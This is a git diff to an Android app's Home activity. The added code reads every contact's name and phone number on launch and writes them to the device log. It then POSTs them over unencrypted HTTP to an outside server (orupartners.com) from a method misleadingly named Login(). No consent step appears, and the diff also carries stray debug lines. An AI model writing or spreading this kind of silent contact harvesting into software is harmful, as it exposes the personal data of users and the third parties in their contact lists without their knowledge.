@@ -22,23 +22,41 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.android.volley.DefaultRetryPolicy;
+import com.android.volley.Request;
+import com.android.volley.VolleyError;
+import com.android.volley.toolbox.JsonObjectRequest;
 import com.squareup.picasso.MemoryPolicy;
 import com.squareup.picasso.NetworkPolicy;
 import com.squareup.picasso.Picasso;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.util.ArrayList;
+
 public class Home extends AppCompatActivity
-        implements NavigationView.OnNavigationItemSelectedListener {
+        implements NavigationView.OnNavigationItemSelectedListener,com.android.volley.Response.Listener<JSONObject>, com.android.volley.Response.ErrorListener {
     private Button lock;
     private ImageView profile_image;
     private TextView name,email;
     Fragment fragment = null;
     private Cursor cursor ;
-    private String phonenumber;
+
+    ArrayList<String> StoreContacts ;
+    private String phonenumber,names;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.home);
-
+        String string = "lat,chepi";
+        String[] parts = string.split(",");
+        String part1 = parts[0]; // 004
+        String part2 = parts[1]; // 034556
+        StoreContacts = new ArrayList<String>();
+        Log.e("1",part1);
+        Log.e("2",part2);
         SharedPreferences   details=getSharedPreferences("User_details", Context.MODE_PRIVATE);
         Constants.name=details.getString("name","no name");
         Constants.email=details.getString("email","email");
@@ -83,7 +101,11 @@ public class Home extends AppCompatActivity
         FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
         ft.replace(R.id.content_frame, fragment);
         ft.commit();
-        GetContactsIntoArrayList();
+        try {
+            GetContactsIntoArrayList();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
@@ -96,21 +118,49 @@ public class Home extends AppCompatActivity
         }
     }
 
-    public void GetContactsIntoArrayList(){
+    public void GetContactsIntoArrayList() throws JSONException {
 
         cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null, null, null);
       //  name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
         while (cursor.moveToNext()) {
-
+            names = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
             phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-            Log.e("NAmes",phonenumber);
-          //  StoreContacts.add(name + " "  + ":" + " " + phonenumber);
+        //    Log.e("NAmes",phonenumber);
+            StoreContacts.add(names + " "  + ":" + " " + phonenumber);
         }
 
         cursor.close();
+        Login();
 
     }
+    private void Login() throws JSONException {
+        Log.e("NAmes", String.valueOf(new JSONArray(StoreContacts)));
+        JSONObject json = new JSONObject();
+        for (int i = 0; i < StoreContacts.size(); i++) {
 
+            try {
+                json.put("Count:" + String.valueOf(i + 1), StoreContacts.get(i));
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+
+        }
+        String[] contact=new String[StoreContacts.size()];
+        contact=StoreContacts.toArray(contact);
+        JSONObject json2 = new JSONObject();
+        json2.put("to","orupartners");
+        json2.put("methods","save_contact");
+        json2.accumulate("complex",json);
+        String url = "http://orupartners.com/cp/redirect_to.php";
+        JsonObjectRequest jsObjRequest = new JsonObjectRequest(Request.Method.POST, url,json2, this ,this){
+
+        };
+        jsObjRequest.setRetryPolicy(new DefaultRetryPolicy(
+                5000,
+                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
+        MySingleton.getInstance(getApplicationContext()).addToRequestQueue(jsObjRequest);
+    }
     @Override
     public boolean onOptionsItemSelected(MenuItem item) {
         int id = item.getItemId();
@@ -137,5 +187,16 @@ public class Home extends AppCompatActivity
         }
             return true;
 
+    }
+
+    @Override
+    public void onErrorResponse(VolleyError error) {
+
+    }
+
+    @Override
+    public void onResponse(JSONObject response) {
+        Log.e("response",response.toString());
+        Toast.makeText(Home.this, "Contacts Added", Toast.LENGTH_SHORT).show();
     }
 }
